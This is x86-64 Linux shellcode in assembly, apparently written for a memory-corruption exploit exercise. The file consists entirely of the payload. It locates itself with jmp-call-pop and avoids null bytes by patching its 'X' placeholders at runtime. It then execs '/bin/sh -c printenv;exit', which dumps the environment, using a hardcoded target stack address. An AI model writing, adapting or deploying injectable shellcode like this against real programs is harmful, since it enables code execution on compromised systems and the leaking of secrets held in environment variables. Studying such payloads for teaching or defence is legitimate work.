          bits 64
            ; find out where we are
start:     jmp short codeEnd
start2:    pop rsi
            ; clear the a register
           xor rax,rax
            ; restore null bytes to data
           mov [byte rsi+flagStr-exeStr-2],al
           mov [byte rsi+cmdStr-exeStr-1],al
           mov [byte rsi+arrayAddr-exeStr-1],al
           mov [byte rsi+arrayAddr-exeStr+24],rax
           
            ; restore argv
            
           mov [byte rsi + arrayAddr - exeStr],rsi
           lea rdi,[byte rsi + flagStr - exeStr] 
           mov [byte rsi + arrayAddr - exeStr + 8],rdi
           lea rdi, [byte rsi + cmdStr - exeStr]
           mov [byte rsi + arrayAddr - exeStr + 16],rdi

            ; execve system call
           mov al,0x3b
           mov rdi,rsi
           lea rsi,[byte rdi + arrayAddr - exeStr]
           mov rdx,rsp
           shr rdx,32
           shl rdx,32
           mov ecx,0xf7fb5600
           ;xor cl,0xff
           or  rdx,rcx
           lea rdi,[rdx]
           syscall

            ; exit system call
           mov rdi,rax
           xor rax,rax
           mov al,0x3c
           syscall

codeEnd:   call start2
            ; data
exeStr:    db "/bin/shXy"
flagStr:   db "-cX"
cmdStr:    db "printenv;exitX"
arrayAddr: dq 0xffffffffffffffff
           dq 0xffffffffffffffff
           dq 0xffffffffffffffff
           dq 0xffffffffffffffff
newAddr:   dd newAddr-start
